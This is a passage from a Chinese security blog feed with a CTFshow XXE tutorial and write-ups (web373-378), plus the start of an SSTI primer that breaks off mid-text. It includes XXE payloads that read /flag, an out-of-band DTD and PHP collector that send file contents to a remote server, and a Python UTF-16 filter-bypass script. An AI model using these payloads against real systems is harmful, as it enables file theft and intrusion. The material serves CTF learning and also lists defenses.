            <tag> 极客大挑战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-xxe</title>
      <link href="/2024/08/05/web%E5%85%A5%E9%97%A8-xxe/"/>
      <url>/2024/08/05/web%E5%85%A5%E9%97%A8-xxe/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><a href="https://www.cnblogs.com/r00tuser/p/7255939.html">[xxe漏洞的学习与利用总结]</a></p><h4 id="xml基础知识"><a href="#xml基础知识" class="headerlink" title="xml基础知识"></a>xml基础知识</h4><p>要了解xxe漏洞，那么一定得先明白基础知识，了解xml文档的基础组成。</p><pre class="language-markup" data-language="markup"><code class="language-markup">XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</code></pre><h5 id="xml文档的构建模块"><a href="#xml文档的构建模块" class="headerlink" title="xml文档的构建模块"></a>xml文档的构建模块</h5><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p><pre class="language-markup" data-language="markup"><code class="language-markup">元素属性实体PCDATACDATA</code></pre><p>下面是每个构建模块的简要描述。</p><h5 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h5><p>元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。<br>实例:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>body text in between<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span>some message in between<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span></code></pre><p>空的 HTML 元素的例子是 “hr”、”br” 以及 “img”。</p><h5 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h5><p>属性可提供有关元素的额外信息<br>实例：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>computer.gif<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><h5 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h5><p>实体是用来定义普通文本的变量。实体引用是对实体的引用。</p><h5 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h5><p>PCDATA 的意思是被解析的字符数据（parsed character data）。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p><h5 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h5><p>CDATA 的意思是字符数据（character data）。<br>CDATA 是不会被解析器解析的文本。<br>DTD(文档类型定义)</p><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p><p>DTD 可以在 XML 文档内声明，也可以外部引用。</p><h5 id="内部声明"><a href="#内部声明" class="headerlink" title="内部声明"></a>内部声明</h5><p> <strong>ex: <code>&lt;!DOCTYOE test any&gt;</code></strong></p><p>完整实例：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token punctuation">[</span><span class="token internal-subset">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">note</span> <span class="token attr-name">(to,from,heading,body)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span>      <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">heading</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span></code></pre><h5 id="外部声明（引用外部DTD）"><a href="#外部声明（引用外部DTD）" class="headerlink" title="外部声明（引用外部DTD）"></a>外部声明（引用外部DTD）</h5><p> <strong>ex: <code>&lt;!DOCTYPE test SYSTEM &#39;http://www.test.com/evil.dtd&#39;&gt;</code></strong></p><p>完整实例:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token name">SYSTEM</span> <span class="token string">"note.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span> </code></pre><p>而note.dtd的内容为:</p><pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;</code></pre><h5 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h5><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p><p>实体又分为一般实体和参数实体</p><h6 id="一般实体的声明语法"><a href="#一般实体的声明语法" class="headerlink" title="一般实体的声明语法:"></a>一般实体的声明语法:</h6><p>引用实体的方式：&amp;实体名；</p><p><strong>参数实体只能在DTD中使用，参数实体的声明格式：</strong></p><p>引用实体的方式：%实体名；</p><h6 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h6><p><strong>ex:<code>&lt;!ENTITY eviltest &quot;eviltest&quot;&gt;</code></strong></p><p>完整实例:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">writer</span> <span class="token attr-name">"Bill</span> <span class="token attr-name">Gates"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">copyright</span> <span class="token attr-name">"Copyright</span> <span class="token attr-name">W3School.com.cn"</span><span class="token punctuation">></span></span></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&writer;">&amp;writer;</span>&amp;copyright;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">></span></span></code></pre><h6 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h6><p>完整实例:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">&lt;!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&writer;">&amp;writer;</span>&amp;copyright;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span></code></pre><p>在了解了基础知识后，下面开始了解xml外部实体注入引发的问题。<br>XXE的攻击与危害（XML External Entity）</p><h5 id="何为XXE"><a href="#何为XXE" class="headerlink" title="何为XXE?"></a>何为XXE?</h5><p>答： xxe也就是xml外部实体注入。也就是上文中加粗的那一部分。</p><h4 id="怎样构建外部实体注入？"><a href="#怎样构建外部实体注入？" class="headerlink" title="怎样构建外部实体注入？"></a>怎样构建外部实体注入？</h4><p>方式一：直接通过DTD外部实体声明<br>方式二：通过DTD文档引入外部DTD文档，再引入外部实体声明<br>方式三：通过DTD外部实体声明引入外部实体声明（好像有点拗口，其实意思就是先写一个外部实体声明，然后引用的是在攻击者服务器上面的外部实体声明）</p><h4 id="产生哪些危害？"><a href="#产生哪些危害？" class="headerlink" title="产生哪些危害？"></a>产生哪些危害？</h4><p>XXE危害1：读取任意文件<br>XXE危害2：执行系统命令<br>XXE危害3：探测内网端口<br>XXE危害4：攻击内网网站</p><h4 id="如何防御xxe攻击"><a href="#如何防御xxe攻击" class="headerlink" title="如何防御xxe攻击"></a>如何防御xxe攻击</h4><p>方案一、使用开发语言提供的禁用外部实体的方法</p><pre class="language-markup" data-language="markup"><code class="language-markup">PHP：libxml_disable_entity_loader(true);JAVA:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Python：from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><p>方案二、过滤用户提交的XML数据<br>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</p><h3 id="web373-378"><a href="#web373-378" class="headerlink" title="web373-378"></a>web373-378</h3><h4 id="web373-有回显xxe-外部实体"><a href="#web373-有回显xxe-外部实体" class="headerlink" title="web373(有回显xxe 外部实体)"></a>web373(有回显xxe 外部实体)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 允许加载外部实体</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// xml文件来源于数据流</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 加载xml实体，参数为替代实体、加载外部子集</span>    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 把 DOM 节点转换为 SimpleXMLElement 对象</span>    <span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 节点嵌套</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">ctfshow</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$ctfshow</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></code></pre><p>注意这里是 <code>echo $creds-&gt;ctfshow;</code>，要将返回的数据包括在 <code>&lt;ctfshow&gt;</code> 中。<br>payload:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">hsad</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">hsad</span> <span class="token attr-name">ANY</span><span class="token punctuation">></span></span>&lt;!ENTITY payload SYSTEM "file:///flag"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hsad</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ctfshow</span><span class="token punctuation">></span></span>        <span class="token entity named-entity" title="&payload;">&amp;payload;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ctfshow</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hsad</span><span class="token punctuation">></span></span></code></pre><h4 id="web374-无回显xxe-外部实体"><a href="#web374-无回显xxe-外部实体" class="headerlink" title="web374(无回显xxe 外部实体)"></a>web374(无回显xxe 外部实体)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></code></pre><p>没有回显，要把读取到的内容也就是flag传到远程服务器查看</p><p>在服务器上创建<code>xxe.php</code>和<code>payload.dtd</code>文件</p><pre class="language-php" data-language="php"><code class="language-php"># xxe.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xxe</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token variable">$xxe</span><span class="token punctuation">,</span><span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd"># payload.dtd&lt;!ENTITY % all&quot;&lt;!ENTITY &#x25; send SYSTEM &#39;http:&#x2F;&#x2F;xxx&#x2F;xxe.php?q&#x3D;%file;&#39;&gt;&quot;&gt;%all;</code></pre><p>然后发送POST请求</p><pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;xxx&#x2F;payload.dtd&quot;&gt;%dtd;%send;] &gt;</code></pre><h4 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/&lt;\?xml version="1\.0"/'</span><span class="token punctuation">,</span> <span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></code></pre><p>相较于上题，多了一个正则表达式，过滤了<code>&lt;?xml version=&quot;1.0&quot;</code>这个字符串</p><p>可以多打几个空格绕过或者直接不写声明也可以</p><p>上题做法同样可以</p><h4 id="web376"><a href="#web376" class="headerlink" title="web376"></a>web376</h4><p>相较于上题，过滤了<code>&lt;?xml version=&quot;1.0&quot;</code>这个字符串同时，<code>/i</code>模式把大小写都过滤了。</p><p>依旧以上方法</p><h4 id="web377-UTF-16"><a href="#web377-UTF-16" class="headerlink" title="web377(UTF-16)"></a>web377(UTF-16)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/&lt;\?xml version="1\.0"|http/i'</span><span class="token punctuation">,</span> <span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   </span></code></pre><p>过滤了http</p><p>可以用UTF-16绕过</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://ee601bc7-6229-49ad-af80-541d5a0b662c.challenge.ctf.show/'</span>data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">&lt;!ENTITY % dtd SYSTEM "http://156.238.233.95/xxe/payload.dtd">%dtd;%send;] >"""</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"done!"</span><span class="token punctuation">)</span></code></pre><h4 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h4><p>开始是个登录框，随便输入后抓包</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY hsad SYSTEM "file:///flag"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&hsad;">&amp;hsad;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&hsad;">&amp;hsad;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>直接打就行</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-ssti</title>
      <link href="/2024/08/05/web%E5%85%A5%E9%97%A8-ssti/"/>
      <url>/2024/08/05/web%E5%85%A5%E9%97%A8-ssti/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>SSTI主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。</p><p><a href="https://blog.csdn.net/qq_51096893/article/details/122020518">Bugku CTF——WEB之SSTI学习笔记_ctf ssti-CSDN博客</a></p><p><a href="https://www.cnblogs.com/dojo-lzz/p/5518474.html">浅谈模板引擎 - 木的树 - 博客园</a></p><p><a href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门</a></p><h4 id="Flask："><a href="#Flask：" class="headerlink" title="Flask："></a>Flask：</h4><p>Flask是一个Python编写的Web 微框架，让我们可以使用Python语言快速实现一个网站或Web服务，在介绍Flask之前首先来聊下它和Django的联系以及区别，django个大而全的web框架，它内置许多模块，flask是一个小而精的轻量级框架，Django功能大而全，Flask只包含基本的配置, Django的一站式解决的思路，能让开发者不用在开发之前就在选择应用的基础设施上花费大量时间。Django有模板，表单，路由，基本的数据库管理等等内建功能。与之相反，Flask只是一个内核，默认依赖于2个外部库： Jinja2 模板引擎和 WSGI工具集–Werkzeug , flask的使用特点是基本所有的工具使用都依赖于导入的形式去扩展，flask只保留了web开发的核心功能。</p><p><img src="begin_1.png" alt="img" loading="lazy"></p><p><img src="begin_2.png" alt="img" loading="lazy"></p><h4 id="Python魔术方法"><a href="#Python魔术方法" class="headerlink" title="Python魔术方法"></a>Python魔术方法</h4><p><strong>class</strong>#查找当前类型的所属对象</p><p><strong>base</strong>_# 沿着父子类的关系往上走一个</p><p><strong>mro</strong> # 查找当前类对象的所有继承类</p><p><strong>subclasses</strong> ()# 查找父类下的所有子类</p><p><strong>init</strong> #查看类是否重载，重载是指程序在运行时就已经加载好了这个模块到内存中如果出现wrapper字眼，说明没有重载</p><p><strong>globals</strong> #函数会议字典的形式返回当前对象的全部全局变量</p><p><img src="begin_3.png" alt="img" loading="lazy"></p><p><strong>jinjia格式</strong></p><pre class="language-python" data-language="python"><code class="language-python">控制结构 <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>变量取值 <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>注释 <span class="token punctuation">&#123;</span><span class="token comment"># #&#125;</span></code></pre><p><strong>了解python的几个函数解析</strong></p><pre class="language-python" data-language="python"><code class="language-python">__class__            类的一个内置属性，表示实例对象的类。__base__             类型对象的直接基类__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases____mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>     返回这个类的子类集合，Each <span class="token keyword">class</span> <span class="token class-name">keeps</span> a <span class="token builtin">list</span> of weak references to its immediate subclasses<span class="token punctuation">.</span> This method returns a <span class="token builtin">list</span> of <span class="token builtin">all</span> those references still alive<span class="token punctuation">.</span> The <span class="token builtin">list</span> <span class="token keyword">is</span> <span class="token keyword">in</span> definition order<span class="token punctuation">.</span>__init__             初始化类，返回的类型是function__globals__          使用方式是 函数名<span class="token punctuation">.</span>__globals__获取function所处空间下可使用的module、方法以及所有变量。__dic__              